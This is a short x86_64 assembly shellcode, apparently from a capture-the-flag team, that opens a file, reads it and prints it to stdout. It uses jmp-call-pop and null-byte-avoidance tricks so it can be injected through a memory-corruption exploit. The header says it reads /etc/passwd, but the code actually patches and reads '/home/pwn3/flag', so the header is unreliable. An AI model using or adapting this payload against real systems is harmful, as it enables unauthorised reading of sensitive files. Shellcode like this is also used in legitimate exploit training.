BITS 64
; Author Mr.Un1k0d3r - RingZer0 Team
; Read /etc/passwd Linux x86_64 Shellcode
; Shellcode size 82 bytes
global _start

section .text

_start:
    jmp _push_filename

_readfile:
    ; syscall open file
    pop rdi ; pop path value
    ; NULL byte fix
    ;inc word [rdi + 15]
    dec byte [rdi + 15]
    inc byte [rdi + 14]

    xor rax, rax
    add al, 2
    xor rsi, rsi ; set O_RDONLY flag
    syscall

    ; syscall read file
    mov rdi, rax
    sub sp, 0x29
    lea rsi, [rsp]
    xor rdx, rdx
    add dx, 0x29; size to read
    sub al, al
    syscall
    sub al, al
    syscall
    sub al, al
    syscall

    ; syscall write to stdout
    xor rdi, rdi
    add dil, 1 ; set stdout fd = 1
    mov rdx, rax
    sub al, al
    add al, 1
    syscall


_push_filename:
    call _readfile
    path: db "/home/pwn3/flaf", 1
